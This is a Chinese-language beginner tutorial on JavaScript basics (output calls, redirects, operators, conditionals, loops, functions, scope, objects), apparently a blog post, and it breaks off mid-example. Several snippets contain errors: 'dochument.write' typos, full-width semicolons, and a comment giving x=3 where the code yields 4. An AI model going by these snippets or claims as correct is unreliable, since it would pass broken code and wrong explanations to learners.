    <content type="html"><![CDATA[<h2 id="常用调试方法"><a href="#常用调试方法" class="headerlink" title="常用调试方法"></a>常用调试方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(x)</span><br><span class="line"><span class="built_in">document</span>.write(q);</span><br><span class="line"><span class="built_in">window</span>.alert(q);</span><br><span class="line"><span class="built_in">window</span>.confirm(确认)；</span><br><span class="line"><span class="built_in">window</span>.prompt(输入)；</span><br><span class="line"><span class="built_in">console</span>.log(q);</span><br><span class="line"><span class="built_in">console</span>.info(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.error(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.debug(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="常用跳转方法"><a href="#常用跳转方法" class="headerlink" title="常用跳转方法"></a>常用跳转方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">&#x27;index.html&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.history.back(-<span class="number">1</span>);</span><br><span class="line"><span class="built_in">window</span>.location=<span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="attr">javascript</span>:location.href=<span class="string">&quot;index.html&quot;</span>;</span><br><span class="line">onclick=<span class="string">&quot;window.location.href=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;javascript:window.location.href=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;location=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">top.location=<span class="string">&#x27;html&#x27;</span>;</span><br><span class="line">self.location=<span class="string">&#x27;html&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="数据类型及数学运算"><a href="#数据类型及数学运算" class="headerlink" title="数据类型及数学运算"></a>数据类型及数学运算</h2><ul><li><em><strong>变量名只能包含字母、数字、下划线、$。并且对大小写敏感</strong></em></li></ul><p>eg:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"> <span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line"> <span class="keyword">var</span> c = <span class="number">4</span>;</span><br><span class="line"> <span class="keyword">var</span> d = <span class="string">&quot;122hello world！333&quot;</span>;  </span><br><span class="line"><span class="comment">//多个字符组合叫字符串，字符型用单引号或者双引号</span></span><br><span class="line"> <span class="keyword">var</span> e = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"> <span class="keyword">var</span> q= a+b;  <span class="comment">//加+减-乘*除/</span></span><br><span class="line"> </span><br><span class="line"> a--; <span class="comment">//自减 1</span></span><br><span class="line"> --a; <span class="comment">//自减 1</span></span><br><span class="line"> a++; <span class="comment">//自加 1</span></span><br><span class="line"> ++a; <span class="comment">//自加 1</span></span><br><span class="line"> a=b; <span class="comment">//赋值  把B赋值给A，把后面的赋值给前面的。</span></span><br><span class="line"> a-=b; </span><br><span class="line"> a+=b; <span class="comment">//相当于a=a+b</span></span><br><span class="line"> sum+=i<span class="comment">//相当于sum=sum+i</span></span><br><span class="line"> a*=b;</span><br><span class="line"> a/=b;<span class="comment">//相当于 a=a/b,同上</span></span><br><span class="line"> a%b   <span class="comment">//取余</span></span><br><span class="line"> <span class="literal">true</span> &amp;&amp; <span class="literal">false</span> = <span class="literal">false</span><span class="comment">//与运算   ?与或非运算。    </span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">var</span> a=<span class="number">10</span>；</span><br><span class="line"> x=a++   </span><br><span class="line"> x=++a</span><br></pre></td></tr></table></figure><ul><li><em><strong>自增自减运算</strong></em></li></ul><p> 自增运算符(一种算数运算符)<br> <em><strong>a++:表示的是a=a+1,先赋值后运算<br> ++a:表示的是a=a+1,先运算后赋值</strong></em><br>i++返回的是自增之前的值，++i返回的是自增后的值。</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a=<span class="number">2</span>             </span><br><span class="line"><span class="keyword">var</span> y=a++; </span><br><span class="line"><span class="keyword">var</span> x=++a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//y=2</span></span><br><span class="line"><span class="comment">//x=3</span></span><br><span class="line">alert(x);                    </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul><li><em><strong>if…else..</strong></em>.</li></ul><p>eg:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age =<span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span>(age&gt;=<span class="number">18</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;已成年&#x27;</span>)   </span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">      dochument.write(<span class="string">&quot;未成年&quot;</span>)        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>if…else if… else</strong></em> </li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = prompt(<span class="string">&quot;输入您的年龄&quot;</span>);  </span><br><span class="line">   <span class="keyword">if</span>(age&gt;=<span class="number">18</span>)<span class="comment">//条件1true</span></span><br><span class="line">   &#123;</span><br><span class="line">     alert(<span class="string">&quot;已成年&quot;</span>) ;  </span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (age&gt;=<span class="number">0</span>&amp;&amp;age&lt;=<span class="number">18</span>)<span class="comment">//条件2true </span></span><br><span class="line">   &#123;</span><br><span class="line">     alert(<span class="string">&quot;未成年&quot;</span>) ;       </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//false</span></span><br><span class="line">    &#123;</span><br><span class="line">    alert(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>*** if…else if…else if…else if…else***</li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = prompt(<span class="string">&quot;输入您的成绩&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (count &gt;= <span class="number">90</span> &amp;&amp; count &lt;= <span class="number">100</span>)&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为A&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">80</span> &amp;&amp; count &lt;= <span class="number">90</span>)&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;你的成绩等级为B&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">60</span> &amp;&amp; count &lt;= <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为C&quot;</span>);      </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">0</span> &amp;&amp; count &lt;= <span class="number">60</span>)&#123;</span><br><span class="line"> <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为不及格！！&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的输入有误，请重新输入！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>判断语句的嵌套</strong></em></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="number">5</span>,y=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(y&gt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y&gt;5&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y&lt;5&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">10</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y==10&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y!=10 &amp;&amp; x&gt;5&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>switch…case</strong></em><br>根据条件，case 选择执行</li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = prompt(<span class="string">&quot;?&quot;</span>)</span><br><span class="line"><span class="keyword">switch</span>(value)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;cat&quot;</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;this is cat&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;dog&quot;</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;this is dog&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;dashuaibi&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>*** 三元运算符***<blockquote><p>条件表达式?语句1:语句2;<br>满足条件执行语句1，不满足执行语句2</p></blockquote></li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">20</span>;</span><br><span class="line">a &gt; b ? <span class="built_in">document</span>.write(<span class="string">&quot;a大&quot;</span>):<span class="built_in">document</span>.write(<span class="string">&quot;b大&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><strong>while循环</strong><blockquote><p>while (条件){<br>循环体语句；<br>} </p></blockquote></li></ul><p>先判断条件，如果为真便执行循环体语句，直到条件为假时才结束</p><p>循环，并继续执行循环程序后的语句，恒真假条件：0&lt;1恒为真，0&gt;1恒为假，只有0为假。-1,1为真。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">sum += i; <span class="comment">//sum=sum+i sum</span></span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(sum)</span><br></pre></td></tr></table></figure><ul><li><strong>do…while循环</strong><blockquote><p>do{<br>//循环体语句；<br>}while(测试条件);</p></blockquote></li></ul><p>do while是先执行循环体语句，在进行条件判断，所以为假时也能执行一次循环体语句。<br>而while语句是先判断条件在执行循环体语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    sum += i; <span class="comment">//sum=sum+i sum</span></span><br><span class="line">    i++;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;=<span class="number">100</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>for循环</strong><blockquote><p>for(表达式1;表达式2;表达式3)<br>{<br>//被执行的代码块<br>}<br>//后续代码 </p></blockquote></li></ul><ul><li>表达式1：循环开始前执行一次</li><li>表达式2：定义运行循环的条件</li><li>表达式3：再循环已被执行之后执行</li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">document</span>.write(i);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li> **for/in便利数组 **</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">of</span> arr)&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> arr)&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i =<span class="number">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(arr[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p> <strong>break&amp;continue语句</strong></p></li><li><p>break退出直接封闭它的switch、while、do while或者for语句，当多个循环语句彼此嵌套时，break只应用于最里层的语句，直接跳出当前循环。</p></li><li><p>continue开始直接封闭它的switch、while、do while或者for语句的一次新迭代，跳过本次循环，进入下一次循环，多个循环语句嵌套时，continue只应用最里层的语句。</p></li></ul><p><em><strong>break</strong></em></p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">var</span> x =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=x + i +<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*** continue***</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        x= x + i + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        dochument.write(x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li><p>封装好的一段代码块</p></li><li><p><strong>不带参数的函数</strong></p><blockquote><p>function 函数名()<br>{<br>//函数体;<br>}</p></blockquote></li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="number">20</span>;</span><br><span class="line">    sum = a + b;</span><br><span class="line">    <span class="built_in">document</span>.write(sum);&#125;</span><br><span class="line"> add();</span><br></pre></td></tr></table></figure><ul><li><strong>带参数的函数</strong><blockquote><p>function 函数名（参数1，参数2，……）<br>{<br>//函数体；<br>}</p></blockquote></li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = a+b;  </span><br><span class="line">   <span class="built_in">document</span>.write(sum);</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">10</span>,<span class="number">20</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>带返回值的函数</strong></li></ul><blockquote><p>function 函数名（参数1，参数2，……）<br>{<br>//函数体；</p><p>return sum；</p><p>}</p></blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    sum = num1+ num2;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> value1 = add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c;</span><br><span class="line">c = value1;</span><br><span class="line"><span class="built_in">document</span>.write(c);</span><br></pre></td></tr></table></figure><ul><li><strong>匿名函数</strong></li></ul><blockquote><p>没有名的函数</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myfunction;</span><br><span class="line">myfunction = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> a*b&#125;;</span><br><span class="line"><span class="keyword">var</span> c = myfunction(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="built_in">document</span>.write(c)</span><br></pre></td></tr></table></figure><ul><li><strong>自调用函数</strong></li></ul><blockquote><p>自己调用自己的函数</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    dochument.write(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于 add();</span></span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><p>局部变量：在函数中通过var声明的变量。</p></li><li><p>全局变量：在函数外通过var声明的变量。</p></li></ul><p>没有声明就使用的变量，默认为全局变量，不论这个变量在哪被使用。</p><ul><li><strong>全局变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = <span class="number">1</span>;<span class="comment">//全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br></pre></td></tr></table></figure><ul><li><strong>局部变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">1</span>;<span class="comment">//局部变量</span></span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br></pre></td></tr></table></figure><ul><li><strong>在函数里面定义全局变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    counter = <span class="number">1</span>;<span class="comment">//在函数里面定义全局变量</span></span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="类-amp-对象"><a href="#类-amp-对象" class="headerlink" title="类&amp;对象"></a>类&amp;对象</h2><ul><li><strong>创建类</strong></li></ul><p>创建一个空白的对象模板，可理解为带参数的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">name,age,job</span>)</span>&#123;    <span class="comment">//创建类</span></span><br><span class="line">    <span class="built_in">this</span>.name= name;         <span class="comment">//类属性</span></span><br><span class="line">    <span class="built_in">this</span>.age=age;</span><br><span class="line">    <span class="built_in">this</span>.job=job;</span><br><span class="line">    <span class="built_in">this</span>.sayname=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br><span class="line">person1 = <span class="keyword">new</span> person(<span class="string">&quot;gets&quot;</span>,<span class="number">23</span>,<span class="string">&quot;CEO&quot;</span>)  <span class="comment">//实例化类 也就是通过new来创建一个对象</span></span><br><span class="line">person1.sayname();</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>创建一个对象</strong></li></ul><p>定义对象的属性，访问对象的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span> : <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    <span class="attr">age</span> : <span class="number">50</span>,</span><br><span class="line">    <span class="attr">eyeColor</span>:<span class="string">&quot;blue&quot;</span></span><br><span class="line">    